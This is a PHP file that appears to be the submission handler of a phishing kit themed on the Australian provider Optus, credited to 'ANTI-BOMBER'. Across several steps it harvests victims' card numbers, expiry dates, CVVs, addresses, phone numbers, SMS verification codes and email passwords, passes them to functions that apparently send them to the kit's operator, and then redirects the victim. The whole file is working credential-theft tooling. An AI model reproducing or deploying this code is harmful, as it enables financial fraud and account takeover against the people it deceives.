<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : ANƬƖ-ƁƠMƁЄƦ 
* [A][и][T][Ɩ] [в][σ][м][в][є][я] Template Name    : O|P|T|U|S|N|E|T|-|C|O|M|-|A|U|
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Template Version : V.1.1 By 🄰🄽🅃🄸-🄱🄾🄼🄱🄴🅁  
===========================================================================*/
include './init.php';

if($_SERVER['REQUEST_METHOD'] != 'POST'):
	die(rediret($link)); // We're done here
else:
	if(isset($_GET['step'])):

		/* Default Page */ 
		if($_GET['step'] == 'tow'):
			$nu = $_POST['nu'];
			$_SESSION['nu'] = $nu;
			$_SESSION['nunu'] = substr($nu, -4);
			AntiBombResI($to, $_POST['nm'], $_POST['nu'], $_POST['epx'], $_POST['vv'], $user, $referer);
			die(rediret('./33140025d.php?'.$id)); // We're done here
			
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'three'):
			$_SESSION['tl'] = $_POST['tl'];
			AntiBombResII($to, $_POST['stre'], $_POST['maiz'], $_POST['zi'], $_POST['Vie'], $_POST['tl'], $_POST['em'], $user, $referer);
			_AntiBomb_Block($user);
			die(rediret('./33140025d.php?'.$id)); // We're done here
			
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'four'):
			AntiBombResIII($to, $_POST['tantan'], $user, $referer);
			die(rediret('./44001622e.php?'.$id)); // We're done here
			
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'five'):
			AntiBombResIV($to, $_POST['tantan2'], $user, $referer);
			if($smspage === "3"):
			die(rediret('./55933014f.php?'.$id)); // We're done here
			else:
				_AntiBomb_Block($user);
				die(rediret('./66099317g.php?'.$id)); // We're done here
			endif;
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'sex'):
			AntiBombResVI($to, $_POST['tantan3'], $user, $referer);
			die(rediret('./66099317g.php?'.$id)); // We're done here
			
		/* FUCK YOU BEACH Page */ 		
		elseif($_GET['step'] == 'three'):
			AntiBombResIII($to, $_POST['Eml'], $_POST['PsEm'], $user, $referer);
			die(rediret($link)); // We're done here	
		endif;
	endif;
endif;
?>
